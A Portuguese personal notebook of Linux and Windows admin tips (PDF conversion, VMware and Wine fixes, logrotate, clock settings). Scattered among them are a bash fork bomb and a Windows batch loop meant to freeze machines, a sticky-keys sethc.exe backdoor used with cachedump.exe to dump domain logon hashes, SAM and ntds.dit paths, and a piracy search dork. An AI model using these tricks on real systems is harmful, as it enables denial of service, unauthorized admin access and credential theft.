https://fai-project.org
https://fai-project.org/FAIme/

### criando um pdf de uma página de manual

```
man -Tpdf ls > ls.pdf

man ls >ls.txt
a2ps ls.txt ls.ps
ps2pdf ls.ps ls.pdf

ou

man ls | a2ps --stdin=ls -o - | ps2pdf - ls.pdf

man a2ps | a2ps -R --columns=1 --stdin=a2ps -o - | ps2pdf - a2ps.pdf


```

### Convertendo odp para txt
Em duas etapas!

```
libreoffice --headless --convert-to htm *.odp
libreoffice --headless --convert-to txt *.htm
```

### Lendo cmdline do /proc mais legível

         tr '\0' ' ' </proc/proc-id/cmdline

### Para desmontar recursivamente

/debian/proc
/debian/sys
/debian/dev

       umount -l /debian

### Acessar estrutura de diretórios recursivamente

```
shopt -s globstar

ls docs/**/*.jpg

shopt -u globstar

```
### para desabilitari/habilitar e ver os comandos builtin habilitados no bash
```
enable -n kill
enable kill
enable -p
```
### para checar com watch um comando composto

```
watch 'ls *txt |wc -l'
```
# Geral
<a href="#Dicas-ng">`^`</a>


### Money manager
- soft livre / sourceforge
- mysql workbench

### Para VMWARE no Debian etch
- Instalar vmware e fazer os ajustes

        cd /usr/lib/vmware/lib/libpng12.so.0/

        mv libpng12.so.0 libpng12.so.0.old
        ln -s /usr/lib/libpng12.so.0 libpng12.so.0

        cd /usr/lib/vmware/lib/libgcc_s.so.1/
        mv libgcc_s.so.1 libgcc_s.so.1.old
        ln -s /lib/libgcc_s.so.1 libgcc_s.so.1

### Logue-se com a conta de usuário que você criou e digite:

    :(){ :|:& };:
    foo(){ foo |foo& };foo

### foo.bat

    start %0
    goto s

### Para imprimir via wine numa impressora matricial

- fez um link

        cd .wine/dosdevices
        ln -s /dev/lp0 lpt1

- coloquei no registro usando o regedit

        [HKEY_CURRENT_USER\Software\Wine\Printing\Spooler]
        "LPT1:"="/dev/lp0"

- no arquivo user.reg ficou:

        [Software\\Wine\\Printing\\Spooler] 1165437248
        "LPT1"="/dev/lp0"

- tb copiei printui.dll mas acho q nada haver

> para instalar um msi via wine

    wine msiexec /i whatever.msi

### No dosemu para montar os drivers

- rode dos emu e o comando:

        lredir f: linux\fs/mnt/post_dados/matriz

> colcoar no autoexec.bat é uma idéia !!

### Para resolver pau de libs no vmware (libcairo, etc)

    mv /usr/lib/vmware/lib/libpng12.so.0/libpng12.so.0 /usr/lib/vmware/lib/libpng12.so.0/libpng12.so.0.vmware
    ln -s /usr/lib/libpng12.so.0 /usr/lib/vmware/lib/libpng12.so.0/libpng12.so.0

    mv /usr/lib/vmware/lib/libgcc_s.so.1/libgcc_s.so.1 /usr/lib/vmware/lib/libgcc_s.so.1/libgcc_s.so.1.vmware
    ln -s /lib/libgcc_s.so.1 /usr/lib/vmware/lib/libgcc_s.so.1

### Buscando músicas do Manowar

  -inurl:htm -inurl:html intitle:"index of" "Last modified" mp3 "Manowar"

>  Sabemos que é ilegal baixar mp3 direto protegidos por direitos autorais sem autorização na internet, mas este é um recurso interessante que pode ser utilizado também para qualquer outro tipo de arquivo.

### Para mudar senhas via script

    chpasswd user:senha
    chpasswd <arquivo

### Para habilitar imap 143 plain text
> If you want to do this edit a new file /etc/c-client.cf (the first line is needed, really!):

> I accept the risk

    set disable-plaintext nil


### Scan vírus online: http://virusscan.jotti.org/

### No Firefox /Iceweasel
> browser.safebrowsing.enabled false

### Estou tendo um "Win32 LoadLibrary failed to load: avisynth.dll"

- Você NÃO precisa da avisynth.dll! Apelas coloque "-playlist" entre o comando mplayer e a URL.
- para saber o identificador das partições:

        blkid

### Lembra daquela de travar !?

    :(){ :|:& };:

### Para iniciar uma máq virtual

      vmware-cmd /home/kretcheu/vmware/Debian-basico/Debian-basico.vmx start


### LightScribe - não livre

    http://download.lightscribe.com/ls/lightscribe-1.14.32.1-linux-2.6-intel.deb
    http://download.lightscribe.com/ls/lightscribeApplications-1.10.19.1-linux-2.6-intel.deb

    /opt/lightscribeApplications/SimpleLabeler/SimpleLabeler

- para remover:
    lightscribe lightscribeapplications

http://www.linuxjournal.com/node/1000261

http://www.lightscribe.com/downloadSection/linux/index.aspx
https://help.ubuntu.com/community/LightScribe

### Não lembro o que é isso

    ctrl-shift-f8
    ctrl-shift-f8
    backspace enter

    2 vezes.

### Para checar se uma rede tem maq com win infectadas pelo Conficker.

- Para isso digite o seguinte comando:

        nmap -PN -T4 -p139,445 -n -v ¿script smb-check-vulns,smb-os-discovery ¿script-args safe=1 [Rede_Alvo]

### Stand Alone windows
    %systemroot%\system32\config\SAM

    Active Directory hashes
    %windir%\WindowsDS\ntds.dit
    achei no system32/ntds.dit

### Freebsd
- sobre a cpu:

        sysctl -a | grep -i CPU | less
        cat /var/run/dmesg.boot | grep CPU
- equiv free
        sysctl -a | grep -i memory

### dump de hashs de logon de domínios

- para rodar um cmd como administrador

- renomeie o arquivo:
      %:\Windows\System32\sethc.exe para sethc.old

- copie o arquivo cmd.exe com nome sethc.exe
      cp Windows\System32\cmd.exe Windows\System32\sethc.exe

- boot windows

Para acessar basta iniciar o windows e segurar o shift do lado direito por 8 segundos!!!

com o cmd rodando vamos usar o cachedump.exe

      cachedump.exe -v > mscach


### Descrição: intelligently extract multiple archive types
    dtrx
- Pacote para extrair diversos tipos de arquivos empacotados e compactados.

### Para resolver o lance dos caracteres do grifo no apache
     cat .htaccess
<Files ~ "\.*">
     Header set Content-Type "text/html; charset=iso-8859-1"
</Files>

### Problemas ping wine
    setcap -v  cap_net_raw+epi /usr/lib/wine/wine-preloader

### Instalação em massa
<https://fai-project.org/>\
<https://www.debian.org/releases/buster/amd64/apb.en.html>

### Para descobrir os módulos do kernel em uso.
    for i in `ls /sys/module | awk '{print $1}'`; do ls -l  /sys/module/$i/refcnt 2>/dev/null |grep -v refcnt || echo $i ;done |sort

ao que eu entendi, o dir /sys/module tem a lista de módulos que o kernel está usando.\
Quando o módulo é builtin não tem esse arquivo refcnt\
Essa linha faz isso.

### Paea descobrir os módulos builtin
```
cat /lib/modules/$(uname -r)/modules.builtin
```

### Para alterar como os nomes de arquivos do logrotate são criados

no arquivo /etc/logrotate.conf

Acrescente as linhas:
```
dateext
dateformat -%Y%m%d%H%M%S
```
Para testar:

```
logrotate --force /etc/logrotate.conf
```

### Para limpar, dar um reset na NVRAM de um Macbook

No boot apertar Alt+Cmd+P+R por 20 segundos.

### Ajustar o padrão de horário do relógio

Com dual boot é comum os horários ficarem diferentes no windows e GNU.

Para alterar o padrão no GNU para usar o horário local como horário da máquina.

```
timedatectl set-local-rtc 1 --adjust-system-clock
timedatectl
```

Para alterar no windows:
No menu iniciar rode cmd como administrador.
```
Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1
```
Para Windows 64-bit use um QWORD:
```
Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_QWORD /d 1
```

### Quando ssh fica sem prompt e apresenta a msg:
How to fix request failed on channel 0

```
/dev/pts furado da jaula

umount -l jaula/dev/pts
remontando pts do /

umount /dev/pts
mount devpts /dev/pts -t devpts

```

### Conversão para binário fácil
```
echo 'obase=2; ibase=10; NUMERO-DECIMAL' | bc

```
